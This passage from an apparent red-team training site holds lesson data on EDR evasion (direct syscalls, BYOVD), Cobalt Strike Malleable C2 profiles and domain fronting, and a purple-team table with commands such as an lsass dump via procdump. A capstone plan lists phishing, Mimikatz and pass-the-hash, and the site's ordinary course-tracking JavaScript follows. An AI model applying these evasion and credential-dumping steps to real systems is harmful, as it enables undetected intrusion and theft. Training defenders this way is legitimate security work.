                        "content": "<p>An <strong>EDR</strong> solution works by placing a sensor deep inside the operating system's kernel. This sensor logs a massive amount of telemetry about system behavior: process creations, network connections, file writes, registry changes, etc. This data is sent to the cloud for analysis by AI models and human threat hunters.</p><p>A key way EDRs collect this data is through <strong>API hooking</strong>. The EDR places a 'hook' on critical Windows functions (e.g., `CreateRemoteThread`). When a program calls this function, the EDR's hook gets executed first, allowing it to inspect the arguments and behavior before passing it on to the real function.</p>",
                        "image": "https://i.imgur.com/3Z4h7k2.png"
                    },
                    {
                        "title": "Bypassing EDR with Direct System Calls",
                        "content": "<p>If an EDR hooks the high-level Windows API functions, an attacker can bypass it by going one level deeper. Instead of calling the hooked function, the attacker can use assembly code to talk directly to the underlying kernel and invoke the raw <strong>system call</strong> (syscall).</p><p>Tools like <strong>SysWhispers2</strong> automate this process. They generate C code that allows an attacker's malware to make direct system calls, effectively unhooking the EDR's sensors and making its actions invisible to that layer of monitoring.</p>",
                        "image": "https://images.unsplash.com/photo-1599508704512-2f19efd1e_35f?w=800&h=400&fit=crop"
                    },
                    {
                        "title": "Bring Your Own Vulnerable Driver (BYOVD)",
                        "content": "<p>This is a highly advanced technique for gaining kernel-level execution. The attacker finds a legitimate, signed hardware driver from a third-party vendor that contains a known vulnerability.</p><div class='info-box warning'><div class='info-box-header'><i class='fas fa-exclamation-triangle'></i><strong>Abusing Trust</strong></div><p>The attacker's malware will first install this legitimate but vulnerable driver onto the target machine. Because the driver is signed by a trusted vendor, security products will allow it to be loaded. The attacker then exploits the vulnerability in the trusted driver to run their own malicious code with the highest possible privilege level (kernel), allowing them to completely disable or blind the EDR product.</p></div>",
                        "image": "https://images.unsplash.com/photo-1573495627361-ab2d_50a8a86a?w=800&h=400&fit=crop"
                    }
                ]
            },
            "codeExamples": [
                {
                    "title": "Using_SysWhispers2_for_Direct_Syscalls.c",
                    "language": "c",
                    "code": "// SysWhispers2 generates a header file and an assembly file.\n// The attacker includes the header in their C/C++ malware.\n#include \"syscalls.h\"\n\n// Instead of calling the standard, hooked Windows API function:\n// CreateRemoteThread(...);\n\n// The attacker calls the direct syscall wrapper provided by SysWhispers2.\n// This will execute the underlying system call directly, bypassing any user-land hooks.\n// The EDR's sensor at this level will not see the call.\nNtCreateThreadEx(...);"
                }
            ],
            "quiz": {
                "passingScore": 75,
                "questions": [
                    {
                        "id": 1,
                        "question": "What is 'API hooking' in the context of an EDR?",
                        "options": [
                            "A type of network attack.",
                            "A technique where the EDR intercepts calls to system functions to monitor process behavior.",
                            "A programming error.",
                            "A method for speeding up API calls."
                        ],
                        "correct": 1,
                        "explanation": "API hooking is a primary mechanism for EDRs to get visibility. By placing a hook, the EDR gets to inspect the function call before the OS does, which is how it detects suspicious behavior like process injection."
                    },
                    {
                        "id": 2,
                        "question": "How do 'direct system calls' help an attacker to bypass an EDR?",
                        "options": [
                            "They don't.",
                            "By invoking the underlying kernel function directly, the attacker can bypass the EDR's user-land API hooks.",
                            "They are easier to program.",
                            "They are slower but more reliable."
                        ],
                        "correct": 1,
                        "explanation": "This technique is a form of 'unhooking'. The attacker is going one level deeper than the EDR's sensors to make their actions invisible to that specific monitoring technique."
                    },
                    {
                        "id": 3,
                        "question": "What is the core idea of a 'Bring Your Own Vulnerable Driver' (BYOVD) attack?",
                        "options": [
                            "The attacker writes their own custom driver.",
                            "The attacker exploits a vulnerability in a legitimate, trusted third-party driver to execute code in the kernel.",
                            "The attacker tries to trick the user into installing a vulnerable driver.",
                            "The attacker uses a USB device."
                        ],
                        "correct": 1,
                        "explanation": "BYOVD is a powerful privilege escalation and defense evasion technique. It abuses the trust that the operating system places in signed drivers to get malicious code running at the kernel level."
                    }
                ]
            }
        },
        {
            "id": "lesson-28",
            "title": "C2 Infrastructure Customization",
            "duration": "75 min",
            "objectives": [
                "Understand the need for C2 customization to evade network detection",
                "Learn how to use Malleable C2 profiles to change a beacon's traffic indicators",
                "Explore the concept of domain fronting to hide C2 infrastructure",
                "Analyze how to choose and configure a C2 profile for a specific target environment"
            ],
            "content": {
                "overview": "Default C2 traffic is a dead giveaway to a skilled defender. To evade modern network defenses, a red team must customize their C2 infrastructure to blend in with legitimate traffic. This lesson covers the advanced techniques used to disguise C2 beacons, focusing on Cobalt Strike's Malleable C2 profiles and the concept of domain fronting.",
                "sections": [
                    {
                        "title": "Malleable C2 Profiles",
                        "content": "<p><strong>Malleable C2</strong> is a feature in Cobalt Strike that allows an operator to completely customize the network indicators of their beacon. A C2 profile is a simple text file that defines how the beacon's traffic should look on the wire.</p><h3>Customizable Indicators:</h3><ul><li><strong>HTTP URIs:</strong> You can make your beacon's GET and POST requests go to a legitimate-looking URL path.</li><li><strong>HTTP Headers:</strong> You can change the User-Agent, the server header, and other HTTP headers to match a known, legitimate application.</li><li><strong>Data Transformation:</strong> You can define how the beacon's data is encoded or encrypted within the HTTP request/response (e.g., hiding it in a cookie).</li></ul>",
                        "image": "https://i.imgur.com/k2H1z5F.png"
                    },
                    {
                        "title": "Blending In",
                        "content": "<p>The goal is to choose a profile that mimics traffic that is common and expected in the target's environment. For example, if the red team knows the target company uses a lot of Microsoft 365, they can use a Malleable C2 profile that makes their beacon's traffic look exactly like legitimate Microsoft Outlook traffic. This makes it much harder for a network analyst to spot the malicious beacon among the sea of normal traffic.</p>",
                        "image": "https://images.unsplash.com/photo-1544383835-bda2bc66a22d?w=800&h=400&fit=crop"
                    },
                    {
                        "title": "Domain Fronting",
                        "content": "<p><strong>Domain fronting</strong> is a technique to hide the true destination of your C2 traffic. It abuses the way that large Content Delivery Networks (CDNs) and cloud providers (like Amazon CloudFront or Google) route traffic.</p><div class='info-box warning'><div class='info-box-header'><i class='fas fa-exclamation-triangle'></i><strong>Hiding Behind a Trusted Domain</strong></div><p>The attacker's beacon will send its HTTPS request to a high-reputation, trusted domain (e.g., a Google domain). The corporate firewall sees a connection to Google and allows it. However, inside the encrypted HTTPS request, a special 'Host' header tells the CDN's servers to forward the request to the attacker's real, hidden C2 server. The defender only sees traffic going to a trusted domain, making the C2 channel extremely difficult to block.</p></div>",
                        "image": "https://i.imgur.com/3Z4h7k2.png"
                    }
                ]
            },
            "codeExamples": [
                {
                    "title": "Amazon_Malleable_C2_Profile.profile",
                    "language": "properties",
                    "code": "# This is a real Malleable C2 profile that mimics Amazon's API.\n# Source: https://github.com/threatexpress/malleable-c2\n\nset sample_name \"amazon\";\nset sleeptime \"30000\"; # 30 seconds\nset jitter    \"10\";\n\nhttp-get {\n    set uri \"/s/ref=nb_sb_noss_1/167-3294888-0262949/field-keywords=books\";\n    client {\n        header \"Host\" \"www.amazon.com\";\n        header \"Accept\" \"*/*\";\n        metadata {\n            # Hide metadata in a session ID cookie\n            cookie \"session-id\";\n        }\n    }\n    server {\n        header \"Server\" \"Server\";\n        header \"Content-Type\" \"text/html; charset=UTF-8\";\n        output {\n            # Prepend a legitimate-looking HTML comment\n            prepend \"<!doctype html><!-- sp-concat-css-assets-6 -->\";\n            print;\n        }\n    }\n}"
                }
            ],
            "quiz": {
                "passingScore": 75,
                "questions": [
                    {
                        "id": 1,
                        "question": "What is the primary purpose of a Malleable C2 profile?",
                        "options": [
                            "To make the C2 beacon run faster.",
                            "To customize the network indicators of a C2 beacon to make it blend in with legitimate traffic.",
                            "To manage persistence.",
                            "To generate payloads."
                        ],
                        "correct": 1,
                        "explanation": "Malleable C2 is an evasion technique. Its goal is to make the beacon's network traffic look like a common, benign application to evade detection by network security monitoring tools."
                    },
                    {
                        "id": 2,
                        "question": "What is 'domain fronting'?",
                        "options": [
                            "A type of phishing attack.",
                            "A technique to hide the true destination of C2 traffic by routing it through a high-reputation domain like a CDN.",
                            "Buying a domain name that looks like a legitimate one.",
                            "A way to make a website load faster."
                        ],
                        "correct": 1,
                        "explanation": "Domain fronting is a powerful infrastructure hiding technique. It makes it very difficult for defenders to block the C2 traffic, because from their perspective, the traffic is just going to a trusted, legitimate service like Google or CloudFront."
                    },
                    {
                        "id": 3,
                        "question": "Why would a red teamer choose a Malleable C2 profile that mimics Microsoft Outlook traffic when attacking a company?",
                        "options": [
                            "Because they like Microsoft Outlook.",
                            "Because it is the only profile available.",
                            "Because if the target company uses Microsoft 365, the malicious C2 traffic will be much harder to spot among the millions of legitimate Outlook connections.",
                            "Because it is the fastest profile."
                        ],
                        "correct": 2,
                        "explanation": "The key to blending in is to mimic traffic that is already common and expected in the target environment. This is a form of camouflage for network traffic."
                    }
                ]
            }
        },
        {
            "id": "lesson-29",
            "title": "Introduction to Purple Teaming",
            "duration": "75 min",
            "objectives": [
                "Understand the concept and goals of a Purple Team exercise",
                "Differentiate purple teaming from red and blue teaming",
                "Explore the collaborative process of testing and improving detections",
                "Learn how to create a TTP testing plan",
                "Analyze the feedback loop between attackers and defenders"
            ],
            "content": {
                "overview": "The ultimate goal of adversary simulation is to make the defenders better. A purple team exercise is a collaborative approach where the red team and the blue team work together to test, measure, and improve the organization's security controls in real-time. This lesson explores this powerful, collaborative security methodology.",
                "sections": [
                    {
                        "title": "What is a Purple Team?",
                        "content": "<p>A purple team is not a separate team, but a collaborative exercise. It's the process of bringing the red team (the attackers) and the blue team (the defenders) together in a single, open workshop.</p><p>Instead of the red team operating in secret, they will announce their actions. The red teamer will say, 'I am now going to execute TTP T1059.001, PowerShell, on this host'. The blue team then checks their monitoring tools. Did they see it? Did an alert fire? If not, the two teams work together to analyze why it was missed and to write a new detection rule. They then re-run the test to validate that the new detection works. This process is repeated for a list of specific TTPs.</p>",
                        "image": "https://i.imgur.com/o3V8Z7j.png"
                    },
                    {
                        "title": "Goals of a Purple Team Exercise",
                        "content": "<ul><li><strong>Improve Detections:</strong> The primary goal is to find gaps in the security monitoring and to write and validate new detection rules.</li><li><strong>Train the Blue Team:</strong> It's an incredible training opportunity for the blue team, as they get to see exactly what an attack looks like in their own tools and data.</li><li><strong>Foster Collaboration:</strong> It breaks down the silos between the offensive and defensive teams and encourages a more collaborative security culture.</li><li><strong>Measure Performance:</strong> It provides a data-driven way to measure the performance of specific security controls against specific threats.</li></ul>",
                        "image": "https://images.unsplash.com/photo-1521791136064-7986c2920216?w=800&h=400&fit=crop"
                    }
                ],
                "codeExamples": [
                    {
                        "title": "Purple_Team_TTP_Testing_Plan.xlsx",
                        "language": "markdown",
                        "code": "| TTP ID    | TTP Name                    | Red Team Command                        | Expected Blue Team Log Source | Detection Status | Notes                                      |\n|-----------|-----------------------------|-----------------------------------------|-------------------------------|------------------|--------------------------------------------|\n| T1059.001 | PowerShell                  | `powershell.exe -c 'whoami'`            | EDR (Process Creation)        | **DETECTED**     | Alert fired in SentinelOne.                |\n| T1548.002 | Bypass User Account Control | `(New-Object -ComObject Shell.Application).ShellExecute(...)` | EDR (Process Creation)        | **MISSED**       | UAC bypass was not detected. Need new rule.|\n| T1003.001 | LSASS Memory Dumping        | `procdump64.exe -ma lsass.exe dump.bin` | EDR (Process Access)          | **DETECTED**     | Alert fired for handle to LSASS process.   |\n| T1021.002 | SMB/Windows Admin Shares    | `dir \\\\TARGET-PC\\C$`                 | Firewall / Network Logs       | **TELEMETRY ONLY**| Logged, but no alert. Can we improve this?|"
                    }
                ]
            },
            "quiz": {
                "passingScore": 75,
                "questions": [
                    {
                        "id": 1,
                        "question": "What is the primary characteristic of a purple team exercise?",
                        "options": [
                            "It is a secret, adversarial operation.",
                            "It is a collaborative exercise where the red and blue teams work together openly.",
                            "It is performed by a third-party team.",
                            "It only focuses on penetration testing."
                        ],
                        "correct": 1,
                        "explanation": "Purple teaming is about collaboration, not adversarial secrecy. The goal is to create a tight feedback loop between the attackers and defenders to improve security."
                    },
                    {
                        "id": 2,
                        "question": "What is a major goal of a purple team exercise?",
                        "options": [
                            "To achieve Domain Admin without being detected.",
                            "To test and improve the blue team's detection and response capabilities for specific TTPs.",
                            "To find as many vulnerabilities as possible.",
                            "To write a formal report for executives."
                        ],
                        "correct": 1,
                        "explanation": "A purple team exercise is a highly focused, data-driven effort to measure and improve detection coverage. The output is not a report, but better security controls."
                    },
                    {
                        "id": 3,
                        "question": "What happens during a purple team exercise if the blue team fails to detect a technique executed by the red team?",
                        "options": [
                            "The exercise ends.",
                            "The red team wins.",
                            "The two teams work together to figure out why it was missed and to build and validate a new detection rule.",
                            "The red team moves on to the next technique."
                        ],
                        "correct": 2,
                        "explanation": "This is the core of the purple team feedback loop. A missed detection is not a failure, but an opportunity to immediately improve the organization's defenses in a measurable way."
                    }
                ]
            }
        },
        {
            "id": "lesson-30",
            "title": "Capstone: Full Engagement Simulation",
            "duration": "120 min",
            "objectives": [
                "Apply the knowledge from the entire course to a practical scenario",
                "Plan and scope a full, multi-stage adversary simulation",
                "Execute the attack chain from initial access to objective completion",
                "Document all actions and findings",
                "Create and present a professional final report"
            ],
            "content": {
                "overview": "This final lesson is the capstone project, where you will bring together everything you have learned to plan, execute, and report on a full adversary simulation from start to finish. This is your opportunity to step into the role of a red team operator and conduct a complete, objective-based engagement in a complex, multi-host lab environment.",
                "sections": [
                    {
                        "title": "The Scenario and Objective",
                        "content": "<p>Students will be provided with a detailed scenario for a fictional company and a complex lab environment that simulates a realistic corporate network. They will be given a high-level objective, such as:</p><p><em>'Your objective is to gain access to the finance department's file server (FIN-SRV01), find the file named `Project_Merger_Plans.docx`, and exfiltrate it from the network. You will start with no prior access.'</em></p>",
                        "image": "https://images.unsplash.com/photo-1521791136064-7986c2920216?w=800&h=400&fit=crop"
                    },
                    {
                        "title": "Execution Phases",
                        "content": "<p>The student will be expected to execute the full Cyber Kill Chain, documenting their progress at each stage:</p><ol><li><strong>Reconnaissance:</strong> Perform OSINT on the fictional company.</li><li><strong>Initial Access:</strong> Conduct a phishing campaign to gain an initial foothold.</li><li><strong>Post-Exploitation:</strong> Perform host and network reconnaissance, escalate privileges, and dump credentials.</li><li><strong>Lateral Movement:</strong> Use the stolen credentials to move through the network towards the target server.</li><li><strong>Objective Completion:</strong> Access the finance server, collect the target file, stage it, and exfiltrate it.</li><li><strong>Cleanup:</strong> Remove all tools and persistence mechanisms.</li></ol>",
                        "image": "https://images.unsplash.com/photo-1510915228340-29c85a43dcfe?w=800&h=400&fit=crop"
                    },
                    {
                        "title": "Final Deliverable",
                        "content": "<p>The final deliverable will be a professional-grade red team report. The report must include:</p><ul><li>A non-technical executive summary that clearly explains the business risk.</li><li>A detailed technical narrative of the entire attack path, with screenshots and evidence.</li><li>A prioritized list of actionable recommendations for the fictional company's blue team.</li></ul>",
                        "image": "https://images.unsplash.com/photo-1551288049-bebda4e38f71?w=800&h=400&fit=crop"
                    }
                ]
            },
            "codeExamples": [
                {
                    "title": "Full_Adversary_Simulation_Attack_Plan.md",
                    "language": "markdown",
                    "code": "# Capstone Attack Plan - Project Kronos\n\n**Objective:** Exfiltrate `Project_Merger_Plans.docx` from `FIN-SRV01`.\n\n**Phase 1: Initial Access**\n- TTP: T1566.001 - Spearphishing Attachment\n- Lure: Fake invoice sent to a user in the 'Accounting' OU.\n- Payload: Malicious Word macro with a C2 stager.\n\n**Phase 2: Execution & Persistence**\n- TTP: T1059.001 - PowerShell\n- TTP: T1547.001 - Registry Run Keys\n- Action: Execute stager, establish persistence with a Run Key.\n\n**Phase 3: Discovery & PrivEsc**\n- TTP: T1087.002 - Domain Account Enumeration (BloodHound)\n- TTP: T1548.002 - Bypass UAC\n- Action: Enumerate AD, find path to local admin.\n\n**Phase 4: Credential Access & Lateral Movement**\n- TTP: T1003.001 - LSASS Memory Dumping (Mimikatz)\n- TTP: T1021.002 - Pass-the-Hash with PsExec\n- Action: Dump hashes from first host, use them to move to other servers.\n\n**Phase 5: Collection, Exfiltration & Impact**\n- TTP: T1560.001 - Archive Collected Data\n- TTP: T1048.003 - Exfiltration Over C2 Channel\n- Action: Find file on FIN-SRV01, zip it, and exfiltrate it over the C2 channel. Create PoC text file."
                }
            ],
            "quiz": {
                "passingScore": 75,
                "questions": [
                    {
                        "id": 1,
                        "question": "What is the primary purpose of a capstone project in a course like this?",
                        "options": [
                            "To review the content of a single lesson.",
                            "To provide a large, hands-on project that allows a student to apply the knowledge and skills from the entire course.",
                            "To take a final exam.",
                            "To learn a new topic."
                        ],
                        "correct": 1,
                        "explanation": "A capstone project is a culminating experience that integrates all the concepts learned throughout the curriculum into a single, comprehensive, practical exercise."
                    },
                    {
                        "id": 2,
                        "question": "In the capstone scenario, which phase involves using BloodHound and finding a way to become a local administrator?",
                        "options": [
                            "Initial Access",
                            "Discovery & Privilege Escalation",
                            "Lateral Movement",
                            "Exfiltration"
                        ],
                        "correct": 1,
                        "explanation": "This phase is all about understanding the environment you are in and increasing your level of control over the initial compromised host."
                    },
                    {
                        "id": 3,
                        "question": "What is the most important final deliverable of the capstone project?",
                        "options": [
                            "The C2 beacon.",
                            "The phishing email.",
                            "A professional red team report that documents the entire engagement and provides actionable recommendations.",
                            "The exfiltrated file."
                        ],
                        "correct": 2,
                        "explanation": "The ultimate product of a red team engagement is the report. It is the document that communicates the value of the exercise to the organization and provides the roadmap for improving their security."
                    }
                ]
            }
        }
    ]
}
      // =====================================================
      // GLOBAL VARIABLES
      // =====================================================
      let currentUser = null;
      let currentLessonIndex = 0;
      let courseProgress = {};
      let userStats = {};
      let quizState = {
        currentQuestion: 0,
        answers: [],
        score: 0,
        isComplete: false,
      };

      // Enhanced session tracking
      let courseSession = {
        startTime: null,
        totalStudyTime: 0,
        lessonsStarted: 0,
        lessonsCompleted: 0,
        pageLoadTime: new Date(),
        interactionCount: 0,
        lastActivityTime: new Date(),
      };

      // Music Player Variables
      let audioPlayer = new Audio();

      // Achievement notification system
      let notificationQueue = [];
      let isShowingNotification = false;

      // =====================================================
      // INITIALIZATION
      // =====================================================
      document.addEventListener("DOMContentLoaded", async () => {
        try {
          showLoadingScreen();
          await checkAuth();

          if (currentUser) {
            // Initialize session tracking
            startCourseSession();

            // Load course data and progress
            await loadCourseData();
            await loadUserProfile();
            await loadProgress();

            // Initialize UI
            initializeEventListeners();
            renderSidebar();
            loadLesson(currentLessonIndex);

            // Initialize additional features
            initMusicPlayer();
            addMusicIndicator();
            initializeActivityTracking();

            hideLoadingScreen();
          } else {
            openAuthModal();
          }
        } catch (error) {
          console.error("Error initializing course:", error);
          hideLoadingScreen();
          showToast("Failed to initialize course system", "error");
        }
      });

      // =====================================================
      // AUTHENTICATION SYSTEM
      // =====================================================
      async function checkAuth() {
        try {
          const {
            data: { session },
            error,
          } = await supabase.auth.getSession();

          if (error) {
            console.error("Auth error:", error);
            currentUser = null;
            openAuthModal();
            return;
          }

          if (!session) {
            currentUser = null;
            openAuthModal();
            return;
          }

          currentUser = session.user;
          updateUIWithUser();
        } catch (error) {
          console.error("Error checking auth:", error);
          currentUser = null;
          openAuthModal();
        }
      }

      function updateUIWithUser() {
        if (!currentUser) return;

        const name =
          currentUser.user_metadata?.full_name ||
          currentUser.email.split("@")[0];
        const userElements = document.querySelectorAll("[data-user-name]");
        userElements.forEach((el) => (el.textContent = name));
      }

      // =====================================================
      // USER PROFILE & STATS MANAGEMENT
      // =====================================================
      async function loadUserProfile() {
        try {
          // 🔍 Step 1: Try to fetch existing profile
          const { data: profile, error } = await supabase
            .from("profiles")
            .select("*")
            .eq("id", currentUser.id)
            .single();

          if (error && error.code !== "PGRST116") {
            throw error;
          }

          if (!profile) {
            // 🆕 Step 2: Create new profile if missing
            await createUserProfile();
          } else {
            // ✅ Step 3: Use existing profile
            userStats = profile;
            await updateLastActivity();
          }
        } catch (error) {
          console.error("❌ Error loading user profile:", error);
          showToast("Failed to load user profile", "error");
        }
      }
      async function createUserProfile() {
        try {
          const newProfile = {
            id: currentUser.id,
            full_name: currentUser.user_metadata?.full_name || "",
            email: currentUser.email,
            level: "Script Kiddie",
            total_points: 0,
            completed_courses: 0,
            current_streak: 0,
            total_certificates: 0,
            total_achievements: 0,
            sections_visited: 0,
            bonus_points: 0,
            in_progress_courses: 0,
            settings_changed: 0,
            midnight_sessions: 0,
            early_sessions: 0,
            weekend_sessions: 0,
            last_activity: new Date().toISOString(),
            created_at: new Date().toISOString(),
          };

          const { error } = await supabase
            .from("profiles")
            .insert([newProfile]);

          if (!error) {
            userStats = newProfile;
            // Award first login achievement
            setTimeout(() => checkAndUnlockAchievement("first_login"), 1000);
          }
        } catch (error) {
          console.error("Error creating user profile:", error);
        }
      }

      async function updateLastActivity() {
        try {
          const now = new Date();

          // Update activity tracking
          courseSession.lastActivityTime = now;

          // Update database
          await supabase
            .from("profiles")
            .update({
              last_activity: now.toISOString(),
            })
            .eq("id", currentUser.id);

          // Check time-based achievements
          await checkTimeBasedAchievements(now);
        } catch (error) {
          console.error("Error updating last activity:", error);
        }
      }

      // =====================================================
      // COURSE SESSION MANAGEMENT
      // =====================================================
      function startCourseSession() {
        courseSession.startTime = new Date();
        courseSession.pageLoadTime = new Date();

        logUserActivity("course_session_start", {
          course_id: COURSE_DATA.id,
          course_title: COURSE_DATA.title,
          user_agent: navigator.userAgent,
          screen_resolution: `${screen.width}x${screen.height}`,
        });

        // Check daily streak
        checkDailyStreak();
      }

      function initializeActivityTracking() {
        // Track page focus/blur for accurate study time
        document.addEventListener("visibilitychange", handleVisibilityChange);

        // Track user interactions
        ["click", "keydown", "scroll", "mousemove"].forEach((event) => {
          document.addEventListener(event, trackUserInteraction, {
            passive: true,
          });
        });

        // Periodic activity updates
        setInterval(updateStudyTime, 60000); // Every minute

        // Save session data before page unload
        window.addEventListener("beforeunload", saveSessionData);
      }

      function handleVisibilityChange() {
        if (document.hidden) {
          courseSession.lastActivityTime = new Date();
        } else {
          // Page became visible again - update activity
          updateLastActivity();
        }
      }

      function trackUserInteraction() {
        courseSession.interactionCount++;
        courseSession.lastActivityTime = new Date();

        // Throttle activity updates
        if (courseSession.interactionCount % 50 === 0) {
          updateLastActivity();
        }
      }

      function updateStudyTime() {
        if (!courseSession.startTime || document.hidden) return;

        const now = new Date();
        const sessionDuration = now - courseSession.startTime;
        courseSession.totalStudyTime = Math.floor(sessionDuration / 1000 / 60); // in minutes

        // Update progress with study time
        saveProgress();
      }

      function saveSessionData() {
        if (!currentUser || !courseSession.startTime) return;

        const sessionData = {
          user_id: currentUser.id,
          course_id: COURSE_DATA.id,
          session_duration: courseSession.totalStudyTime,
          lessons_viewed: courseSession.lessonsStarted,
          lessons_completed: courseSession.lessonsCompleted,
          interactions: courseSession.interactionCount,
          session_date: courseSession.startTime.toISOString().split("T")[0],
        };

        // Store in localStorage as backup
        localStorage.setItem(
          "course_session_backup",
          JSON.stringify(sessionData)
        );

        // Try to save to database
        logUserActivity("course_session_end", sessionData);
      }

      // =====================================================
      // COURSE DATA & PROGRESS MANAGEMENT
      // =====================================================
      async function loadCourseData() {
        try {
          // Update course info in UI
          document.getElementById("courseTitle").textContent =
            COURSE_DATA.title;
          document.getElementById("totalLessons").textContent =
            COURSE_DATA.lessons.length;

          // Log course access
          logUserActivity("course_access", {
            course_id: COURSE_DATA.id,
            course_title: COURSE_DATA.title,
          });
        } catch (error) {
          console.error("Error loading course data:", error);
        }
      }

      async function loadProgress() {
        try {
          // Get existing progress from database
          const { data, error } = await supabase
            .from("course_progress")
            .select("*")
            .eq("user_id", currentUser.id)
            .eq("course_id", COURSE_DATA.id)
            .single();

          if (error && error.code !== "PGRST116") {
            throw error;
          }

          if (data) {
            courseProgress = JSON.parse(data.lesson_progress || "{}");
            currentLessonIndex = data.current_lesson || 0;

            // Update session tracking
            courseSession.lessonsStarted = Object.keys(courseProgress).length;
            courseSession.lessonsCompleted = Object.values(
              courseProgress
            ).filter((p) => p.completed).length;
          } else {
            // Initialize new progress
            courseProgress = {};
            currentLessonIndex = 0;
            await saveProgress();

            // Award first course start achievement
            await checkAndUnlockAchievement("first_course_start");
          }

          updateProgressDisplay();
        } catch (error) {
          console.error("Error loading progress:", error);
          showToast("Failed to load progress", "error");
        }
      }

      async function saveProgress() {
        try {
          if (!currentUser) return;

          const now = new Date();
          const progressData = {
            user_id: currentUser.id,
            course_id: COURSE_DATA.id,
            course_title: COURSE_DATA.title,
            current_lesson: currentLessonIndex,
            lesson_progress: JSON.stringify(courseProgress),
            progress: calculateOverallProgress(),
            lessons_completed: getCompletedLessonsCount(),
            lessons_started: Object.keys(courseProgress).length,
            study_time_minutes: courseSession.totalStudyTime,
            last_accessed: now.toISOString(),
            updated_at: now.toISOString(),
          };

          // Upsert progress
          const { error } = await supabase
            .from("course_progress")
            .upsert([progressData]);

          if (error) throw error;

          // Update user stats
          await updateUserStats();

          updateProgressDisplay();
        } catch (error) {
          console.error("Error saving progress:", error);
          showToast("Failed to save progress", "error");
        }
      }

      async function updateUserStats() {
        try {
          // Get all course progress for this user
          const { data: allProgress, error } = await supabase
            .from("course_progress")
            .select("progress, course_id, study_time_minutes")
            .eq("user_id", currentUser.id);

          if (error) throw error;

          // Calculate stats
          const completedCourses =
            allProgress?.filter((p) => p.progress >= 100).length || 0;
          const inProgressCourses =
            allProgress?.filter((p) => p.progress > 0 && p.progress < 100)
              .length || 0;
          const totalStudyTime =
            allProgress?.reduce(
              (sum, p) => sum + (p.study_time_minutes || 0),
              0
            ) || 0;

          // Calculate points (500 per completed course + achievement points)
          const coursePoints = completedCourses * 500;
          const bonusPoints = userStats.bonus_points || 0;
          const totalPoints = coursePoints + bonusPoints;

          // Update profile
          const updateData = {
            completed_courses: completedCourses,
            in_progress_courses: inProgressCourses,
            total_points: totalPoints,
            total_study_time: totalStudyTime,
            last_activity: new Date().toISOString(),
          };

          const { error: updateError } = await supabase
            .from("profiles")
            .update(updateData)
            .eq("id", currentUser.id);

          if (updateError) throw updateError;

          // Update local stats
          Object.assign(userStats, updateData);
        } catch (error) {
          console.error("Error updating user stats:", error);
        }
      }

      function calculateOverallProgress() {
        const completedLessons = getCompletedLessonsCount();
        return Math.round(
          (completedLessons / COURSE_DATA.lessons.length) * 100
        );
      }

      function getCompletedLessonsCount() {
        return Object.values(courseProgress).filter(
          (lesson) => lesson.completed
        ).length;
      }

      function updateProgressDisplay() {
        const completedCount = getCompletedLessonsCount();
        const progressPercent = calculateOverallProgress();

        // Update UI elements
        const elements = {
          completedLessons: completedCount,
          courseProgressPercent: `${progressPercent}%`,
        };

        Object.entries(elements).forEach(([id, value]) => {
          const element = document.getElementById(id);
          if (element) element.textContent = value;
        });

        // Update progress bar
        const progressBar = document.getElementById("courseProgressFill");
        if (progressBar) progressBar.style.width = `${progressPercent}%`;
      }

      // =====================================================
      // LESSON MANAGEMENT
      // =====================================================
      function loadLesson(index) {
        if (index < 0 || index >= COURSE_DATA.lessons.length) return;

        const lesson = COURSE_DATA.lessons[index];
        currentLessonIndex = index;

        // Mark lesson as started and track activity
        if (!courseProgress[lesson.id]) {
          courseProgress[lesson.id] = {
            started: true,
            completed: false,
            startedAt: new Date().toISOString(),
            timeSpent: 0,
          };

          courseSession.lessonsStarted++;
          saveProgress();

          // Log lesson start
          logUserActivity("lesson_start", {
            lesson_id: lesson.id,
            lesson_title: lesson.title,
            lesson_index: index,
          });
        }

        // Update lesson start time for time tracking
        courseProgress[lesson.id].currentSessionStart = new Date();

        // Update sidebar and navigation
        renderSidebar();
        updateNavigationButtons();

        // Update header info
        updateLessonHeader(lesson, index);

        // Render lesson content
        renderLessonContent(lesson);

        // Smooth scroll and animations
        window.scrollTo({ top: 0, behavior: "smooth" });
        document.getElementById("contentBody").scrollTop = 0;

        const contentBody = document.getElementById("contentBody");
        contentBody.classList.add("fade-in");
        setTimeout(() => contentBody.classList.remove("fade-in"), 500);

        // Check lesson-based achievements
        checkLessonAchievements(index + 1);
      }

      function updateLessonHeader(lesson, index) {
        const elements = {
          currentLessonNumber: index + 1,
          currentLessonTitle: lesson.title,
          navInfo: `Lesson ${index + 1} of ${COURSE_DATA.lessons.length}`,
        };

        Object.entries(elements).forEach(([id, value]) => {
          const element = document.getElementById(id);
          if (element) element.textContent = value;
        });
      }

      function renderSidebar() {
        const lessonNav = document.getElementById("lessonNav");
        if (!lessonNav) return;

        lessonNav.innerHTML = "";

        COURSE_DATA.lessons.forEach((lesson, index) => {
          const lessonItem = document.createElement("div");
          lessonItem.className = "lesson-item";

          // Determine lesson status
          const lessonProgress = courseProgress[lesson.id];
          const isCompleted = lessonProgress?.completed || false;
          const isInProgress = lessonProgress?.started || false;
          const isLocked = !isCompleted && !canAccessLesson(index);
          const isActive = index === currentLessonIndex;

          // Apply status classes
          if (isCompleted) lessonItem.classList.add("completed");
          if (isLocked) lessonItem.classList.add("locked");
          if (isActive) lessonItem.classList.add("active");

          // Determine status display
          let statusClass = "not-started";
          let statusIcon = index + 1;

          if (isCompleted) {
            statusClass = "completed";
            statusIcon = "✓";
          } else if (isInProgress) {
            statusClass = "in-progress";
            statusIcon = "◐";
          }

          // Create lesson item HTML
          lessonItem.innerHTML = `
            <div class="lesson-status ${statusClass}">${statusIcon}</div>
            <div class="lesson-info">
                <div class="lesson-title">${lesson.title}</div>
                <div class="lesson-meta">
                    ${
                      isCompleted
                        ? "Completed"
                        : isInProgress
                        ? "In Progress"
                        : isLocked
                        ? "Locked"
                        : "Not Started"
                    }
                </div>
            </div>
            <div class="lesson-duration">${lesson.duration}</div>
        `;

          // Add click handler if not locked
          if (!isLocked) {
            lessonItem.addEventListener("click", () => {
              if (index !== currentLessonIndex) {
                // Track lesson time before switching
                trackLessonTime();

                currentLessonIndex = index;
                loadLesson(index);
                closeSidebar();
              }
            });
          }

          lessonNav.appendChild(lessonItem);
        });
      }

      function canAccessLesson(index) {
        if (index === 0) return true; // First lesson always accessible

        // Can access if previous lesson is completed
        const previousLessonId = COURSE_DATA.lessons[index - 1].id;
        return courseProgress[previousLessonId]?.completed || false;
      }

      function trackLessonTime() {
        const currentLesson = COURSE_DATA.lessons[currentLessonIndex];
